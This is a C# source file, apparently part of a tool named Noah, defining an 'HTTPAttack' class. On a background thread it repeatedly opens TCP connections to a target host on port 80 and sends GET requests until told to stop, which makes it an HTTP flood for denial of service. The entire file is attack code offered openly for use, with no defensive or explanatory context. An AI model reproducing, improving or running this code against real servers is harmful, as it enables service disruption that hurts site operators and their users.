using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Noah.Attacks
{
    public class HTTPAttack : IAttack
    {
        public string AttackName { get; private set; }

        private string message;
        private ApplicationState state;
        private string ip;

        public HTTPAttack(string host, ApplicationState state)
        {
            StringBuilder sb = new StringBuilder("GET ");
            sb.Append(host);
            sb.AppendLine(" HTTP/1.1");

            message = sb.ToString();
            this.state = state;
            ip = host;
        }

        public void BeginAttack()
        {
            new Thread(() => attack()).Start();
        }

        private void attack()
        {
            state.State = States.Attacking;
            byte[] bytes = Encoding.ASCII.GetBytes(message);

            while (state.State != States.Done)
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.Connect(ip, 80);
                sock.Send(bytes, SocketFlags.None);
            }
        }
    }
}